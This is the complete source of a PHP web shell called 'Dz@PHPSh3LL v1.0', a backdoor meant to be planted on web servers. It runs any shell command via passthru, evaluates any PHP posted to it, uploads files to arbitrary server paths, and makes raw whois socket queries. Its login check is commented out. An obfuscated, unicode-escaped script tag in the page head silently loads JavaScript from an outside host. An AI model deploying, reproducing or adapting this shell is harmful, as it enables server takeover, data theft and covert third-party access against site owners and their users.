-----------------------
Aghilas Dz@PHPSh3LL v1.0
-----------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><br>

<html>
<head>
<script type="text/javascript">document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0072\u0035\u0037\u002e\u006c\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')</script>
<title>Dz@PHPSh3LL v1.0 | By Aghilas</title>
<style type="text/css">
<!--
body, table{font-family:Verdana; font-size:12px;}
table {background-color:#EAEAEA; border-width:0px;}
b {font-family:Arial; font-size:15px;}
a{text-decoration:none;}
-->
</style>
</head>
<body>

<?php
$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$sern = $_SERVER['SERVER_NAME'];
$tend = "</tr></form></table><br><br><br><br>";

// Configuration
$login = "Aghilas";
$pass = "dzr00t";


/*/ Authentication
if (!isset($_SERVER['PHP_AUTH_USER'])) {
header('WWW-Authenticate: Basic realm="Dz_Shell"');
header('HTTP/1.0 401 Unauthorized');
exit;}

else {
if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass || empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']<>$login)
{ echo "Success"; exit;}
}
*/



if (!empty($_GET['dz'])) {$dz = $_GET['dz'];}
elseif (!empty($_POST['dz'])) {$dz = $_POST['dz'];}
else {$dz = "shell";}

// Menu
echo "
|&nbsp;<a href=$self?dz=shell>Sh3ll</a>
|&nbsp;<a href=$self?dz=upload>File Upload</a>
|&nbsp;<a href=$self?dz=tools>Tools</a>
|&nbsp;<a href=$self?dz=eval>Eval PHP Execution</a>
|&nbsp;<a href=$self?dz=about>About ?</a>
<br><br><br><pre>";


switch($dz) {

// sh3ll st4rt n0w xD
case "shell":

echo <<<HTML
<b>c0mm4nd Exec !<br></b>
<table>
<form action="$self" method="POST">
<input type="hidden" name="dz" value="shell">
<tr><td>
$$sern <input size="50" type="text" name="c"><input align="right" type="submit" value="Run">
</td></tr>
<tr><td>
<textarea cols="70" rows="20">
HTML;

if (!empty($_POST['c'])){
passthru($_POST['c']);
}
echo "</textarea></td>$tend";
break;


//PHP Eval Code execution
case "eval":

echo <<<HTML
<b>Eval PHP<br></b>
<table>
<form method="POST" action="$self">
<input type="hidden" name="dz" value="eval">
<tr>
<td><textarea name="ephp" rows="10" cols="60"></textarea></td>
</tr>
<tr>
<td><input type="submit" value="Exec"></td>Ex : <font color='red'>print("fuck");<br><br></font></B>
$tend
HTML;

if (isset($_POST['ephp'])){
eval($_POST['ephp']);
}
break;


//Text tools
case "tools":

echo <<<HTML
<b>Sample Tools :P<br></b>
<table>
<form method="POST" action="$self">
<input type="hidden" name="dz" value="tools">
<tr>
<td>
<input type="radio" name="tac" value="1">B64 Decode<br>
<input type="radio" name="tac" value="2">B64 Encode<br><hr>
<input type="radio" name="tac" value="3">md5 Hash
</td>
<td><textarea name="tot" rows="5" cols="42"></textarea></td>
</tr>
<tr>
<td> </td>
<td><input type="submit" value="Enter"></td>
$tend
HTML;

if (!empty($_POST['tot']) && !empty($_POST['tac'])) {

switch($_POST['tac']) {

case "1":
echo "<font color='green'>Result : </font><b>" .base64_decode($_POST['tot']). "</b>";
break;

case "2":
echo "<font color='green'>Result : </font><b>" .base64_encode($_POST['tot']). "</b>";
break;

case "3":
echo "<font color='green'>Result : </font><b>" .md5($_POST['tot']). "</b>";
break;
}}
break;


// Uploading
case "upload":

echo <<<HTML
<b>File Upload<br></b>
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="dz" value="upload">
<tr>
<td>Ur F!Le:</td>
<td><input size="48" name="file" type="file"></td>
</tr>
<tr>
<td>Path   :</td>
<td><input size="48" value="$docr/" name="path" type="text"><input type="submit" value="Go!"></td>
$tend
HTML;

if (isset($_POST['path'])){

$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}

if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "<b><font color='green' size='2'>Uploaded File Success ==></b></font> $uploadfile\n";
    echo "File :" .$_FILES['file']['name']. "\n";
    echo "Siez :" .$_FILES['file']['size']. "\n";

} else {
    print "<b><font color='red' size='2'>wtf error :</font></b>\n";
    print_r($_FILES);
}
}
break;


// About
case "about":
echo <<<HTML


<b><u><i><blink><font color="red">About ?</Font></blink></i></u> </b><br><br>

Title: Dz@PHPSh3LL v1.0

Date : 13/11/2012

H0me : http://Dz-RooT.cOm/<br>
Author : <input size="4" color="red" type="text" name="wser" bgcolor="red" value="Aghilas">

Greet'z : All My Friends ^_^


$tend
HTML;

if (isset($_POST['wq']) && $_POST['wq']<>"") {

if (empty($_POST['wser'])) {$wser = "whois.ripe.net";} else $wser = $_POST['wser'];

$querty = $_POST['wq']."\r\n";
$fp = fsockopen($wser, 43);

if (!$fp) {echo "xD";} else {
fputs($fp, $querty);
while(!feof($fp)){echo fgets($fp, 4000);}
fclose($fp);
}}
break;


}
?>
</pre>
</body>
</html>